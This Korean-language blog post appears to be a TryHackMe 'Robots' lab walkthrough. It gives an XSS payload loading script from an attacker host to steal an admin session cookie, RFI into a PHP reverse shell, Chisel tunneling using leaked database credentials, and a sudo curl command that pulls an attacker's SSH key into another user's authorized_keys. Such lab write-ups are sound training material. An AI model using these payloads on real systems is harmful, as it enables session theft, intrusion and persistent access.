---
title: '[TryHackme] Robots'
date: 2025-12-04 00:01:01 +0800
category: Webhacking
tags: [tryhackme, wargame]
#pin: true
---

## 1. 정찰 및 초기 웹 서비스 분석 (Reconnaissance)
### 1.1 포트 스캔 (Nmap)
- Nmap을 사용하여 대상 시스템을 스캔하여 열려 있는 포트와 서비스 버전을 확인합니다.

- 스캔 결과, 22/tcp (SSH), 80/tcp (HTTP), 9000/tcp (HTTP) 포트가 열려 있음을 확인합니다.

### 1.2 웹 서비스 접근 및 robots.txt 분석
- 80번 포트로 접근하면 접근 권한이 없어 Forbidden 에러가 발생합니다.

- 9000번 포트로 접근하면 별다른 힌트 없이 Apache 서버가 동작 중인 것만 확인됩니다.

- 80번 포트의 웹 서비스에서 접근점을 찾기 위해 /robots.txt 파일을 확인합니다.

- robots.txt 파일에서 다음의 3가지 경로가 Disallow 설정으로 노출되는 것을 확인합니다.

```
/harming/humans

/ignoring/human/orders

/harm/to/self
```


## 2. 관리자 세션 탈취를 위한 취약점 악용 (XSS/CSRF)
### 2.1 /harm/to/self 경로 분석
- 노출된 경로 중 /harm/to/self로 접근하면 계정 생성 및 로그인 기능이 존재함을 확인합니다.

- 회원가입 시 "관리자가 새로운 계정을 모니터링한다"는 설명과 함께 사용자 이름에 XSS(Cross-Site Scripting) 취약점이 존재할 가능성을 추측합니다.

### 2.2 XSS/CSRF를 통한 세션 탈취 전략
- 일반적인 XSS를 통한 쿠키 탈취는 HttpOnly 설정으로 인해 불가능합니다.

- 하지만, 웹 페이지 내에 **Server info**라는 페이지가 존재하며, 이 페이지가 HTTP_COOKIE 값을 출력하는 것을 발견합니다.

- 이를 악용하여, 공격자 서버로 관리자의 쿠키 값을 전송하는 CSRF(Cross-Site Request Forgery) 공격을 시도합니다.

### 2.3 세션 탈취 실행
- 공격용 JavaScript 파일 준비: 공격자 서버에 xss_script.js 파일을 저장합니다. 이 스크립트는 XMLHttpRequest를 사용하여 server_info.php 페이지를 요청하고, 응답 본문에서 **관리자의 PHPSESSID**를 정규식을 이용해 추출한 뒤, 이 쿠키 값을 공격자 서버로 전송하도록 설계됩니다.

- XSS 페이로드 삽입: 새로운 계정을 생성할 때 사용자 이름(username)에 XSS 페이로드인 `<script src=http://<공격자 ip>/xss_script.js></script>`를 삽입하여 회원가입합니다.

- 세션 탈취 확인: 관리자가 새로운 계정을 확인하는 순간, 관리자의 브라우저에서 XSS 스크립트가 실행되고, 관리자의 세션 쿠키가 공격자 서버로 전송됩니다.

## 3. 웹 쉘 획득 (RFI/RCE)
### 3.1 추가 엔드포인트 및 취약점 발견
- 탈취한 관리자 세션을 사용하여 **gobuster**를 실행해 웹 디렉터리를 탐색합니다.

- /harm/to/self/admin.php 경로를 발견합니다.

- 해당 페이지는 특정 URL을 테스트하는 기능이 있으며, 입력값을 분석해보면 내부적으로 include() 함수를 사용하는 것을 추측합니다.

- /etc/passwd와 같은 내부 파일을 읽는 테스트를 통해 LFI(Local File Inclusion) 취약점이 있음을 확인하고, 나아가 **RFI(Remote File Inclusion)**를 통한 **RCE(Remote Code Execution)**가 가능함을 짐작합니다.

### 3.2 리버스 쉘 실행 (RCE)
- 리버스 쉘 파일 준비: 공격자 서버에 리버스 연결을 맺을 수 있는 PHP 쉘 파일을 준비하고 웹 서비스를 오픈합니다.

- 쉘 연결: admin.php의 URL 테스트 기능에 준비된 PHP 쉘 파일의 URL을 입력하여 포함(Include)시킵니다.

- 쉘 획득: 공격자는 nc (netcat)을 열어 두고 있다가, 타겟 서버에서 실행된 리버스 쉘을 통해 www-data 권한의 제한된 쉘을 획득합니다.

>TTY (TeleTypewriter) 부재: 일반적인 SSH 접속과는 달리, 리버스 쉘은 백그라운드 프로세스처럼 동작하며 **tty (터미널 장치)**가 할당되지 않습니다.
그러므로 명령줄 편집(방향키, 백스페이스)이 제대로 작동하지 않고, $PATH 변수가 제대로 설정되지 않아 일부 명령어(sudo)를 실행할 수 없거나 자동 완성이 불가능해집니다.
{: .prompt-info }

- 쉘 안정화: Python이 없는 환경의 제한된 쉘을 `script -qc /bin/bash /dev/null` 등의 명령어를 사용하여 완전한 쉘(www-data@robots:/$)로 안정화합니다.

## 4. 데이터베이스 자격 증명 탈취 및 내부망 정찰
### 4.1 데이터베이스 자격 증명 획득
- 쉘 환경에서 웹 서비스 설정 파일인 /var/www/html/harm/to/self/config.php를 확인합니다.

- 해당 파일에서 데이터베이스 접속 정보가 노출된 것을 확인합니다.

```
username: robots

password: q4qCz1OflKvKwK4S

servername: db
```


### 4.2 내부망 데이터베이스 서버 주소 확인
- /etc/hosts 파일을 확인하여 도메인과 매핑된 내부망 IP를 확인합니다.

- 설정 파일에서 확인한 servername인 **db**의 실제 IP 주소를 찾기 위해 getent hosts db 명령어를 사용합니다.

- 결과로 데이터베이스 서버의 내부 IP 주소 **172.18.0.2**를 확인합니다.

## 5. 터널링 및 사용자 계정 획득
### 5.1 Chisel을 이용한 포트 포워딩
- 공격자 측에서 내부망에 있는 DB 서버(172.18.0.2:3306)에 접근하기 위해 Chisel 툴을 사용하여 리버스 포트 포워딩 터널을 구축합니다.

- 공격자 서버: Chisel 서버를 시작하고 리버스 터널링을 허용합니다.

```bash
chisel server --port 52528 --reverse
```
- 타겟 서버 (www-data 쉘): Chisel 클라이언트를 실행하여 내부의 DB 포트(3306)를 공격자 서버의 3306 포트로 포워딩합니다.

```bash
chisel client <공격자 ip>:52528 R:3306:172.18.0.2:3306
```


### 5.2 데이터베이스 접근 및 사용자 비밀번호 획득
- 터널링을 통해 공격자 시스템의 127.0.0.1:3306으로 접근하면 내부 DB 서버에 연결됩니다.

- 탈취한 DB 계정 정보로 접속합니다: `mysql -h 127.0.0.1 -u robots -p`

- 데이터베이스에서 user_account 테이블을 조회하여 rgiskard 계정의 비밀번호 해시 값(yWJpU0xLckNqYnJ5YmQ4dA==)을 획득하고 이를 Base64 디코딩하여 실제 비밀번호를 알아냅니다.

- 획득한 비밀번호로 rgiskard 계정으로 SSH 접속에 성공합니다.

## 6. 최종 권한 상승 (Privilege Escalation)
### 6.1 sudo 권한 확인 및 취약점 악용
- rgiskard 계정으로 SSH 접속 후, sudo -l 명령어를 통해 rgiskard가 다른 사용자 권한으로 실행할 수 있는 명령어를 확인합니다.

- dolivaw 사용자 권한으로 다음 명령어를 실행할 수 있는 권한을 확인합니다:

```
(dolivaw) /usr/bin/curl 127.0.0.1/*
```

### 6.2 curl 오용을 통한 dolivaw 권한 획득
- dolivaw 계정으로의 권한 상승을 위해 curl 명령의 취약점(로컬 파일 쓰기)을 악용하여 SSH 키를 삽입합니다.

- 공격자 서버: 새로운 SSH 키 쌍을 생성하고 **공개 키(id_rsa.pub)**를 공격자 서버에서 호스팅합니다.

- authorized_keys 덮어쓰기: rgiskard 계정에서 
`sudo -u dolivaw /usr/bin/curl 127.0.0.1/ -o /dev/null http://<attacker_ip>/id_rsa.pub -o /home/dolivaw/.ssh/authorized_keys` 명령어를 실행하여, 공격자의 공개 키를 dolivaw 사용자의 authorized_keys 파일에 기록합니다.

- 최종 권한 획득: 공격자는 자신의 개인 키를 사용하여 dolivaw 계정으로 SSH 접속에 성공합니다. (이를 통해 최종 Root 권한을 얻는 과정을 진행하게 됩니다.)



#### 참고
<https://saeed0x1.medium.com/stabilizing-a-reverse-shell-for-interactive-access-a-step-by-step-guide-c5c32f0cb839>
<https://velog.io/@agnusdei1207/Shell-%EC%95%88%EC%A0%95%ED%99%94>
<https://p0lestar.github.io/posts/Shell-Stabilization/>
<https://hg2lee.tistory.com/entry/Robots-TryHackMe>